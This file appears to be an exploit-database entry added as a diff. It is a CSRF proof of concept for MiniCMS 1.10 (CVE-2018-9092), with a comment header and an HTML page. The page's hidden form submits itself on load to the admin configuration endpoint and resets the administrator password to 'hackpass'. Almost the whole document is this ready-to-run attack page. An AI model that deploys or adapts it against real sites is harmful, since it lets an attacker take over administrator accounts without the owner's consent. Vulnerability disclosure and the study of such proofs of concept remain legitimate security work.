@@ -1,0 +1,36 @@
+<--
+# Exploit Title:  MiniCMS 1.10 CSRF Vulnerability
+# Date: 2018-03-28
+# Exploit Author: zixian（me@zixian.org、zixian@5ecurity.cn）
+# Vendor Homepage: https://github.com/bg5sbk/MiniCMS
+# Software Link: https://github.com/bg5sbk/MiniCMS
+# Version: 1.10
+# CVE : CVE-2018-9092
+
+
+
+There is a CSRF vulnerability that can change the administrator account password
+After the administrator logged in, open the following page
+ poc:
+-->
+
+ <html>
+ <head><meta http-equiv="Content-Type" content="text/html; charset=GB2312">
+ <title>test</title>
+ <body>
+ <form action="http://127.0.0.1/minicms/mc-admin/conf.php" method="post">
+ <input type="hidden" name="site_name" value="hack123" />  
+ <input type="hidden" name="site_desc" value="hacktest" />  
+ <input type="hidden" name="site_link" value="http://127.0.0.1/minicms" />  
+ <input type="hidden" name="user_nick" value="hack" />  
+ <input type="hidden" name="user_name" value="admin" />  
+ <input type="hidden" name="user_pass" value="hackpass" />  
+ <input type="hidden" name="comment_code" value="" />  
+ <input type="hidden" name="save" value=" " /> 
+ </form>
+ <script>
+  document.forms[0].submit();
+ </script>
+ </body>
+ </head>
+ </html>
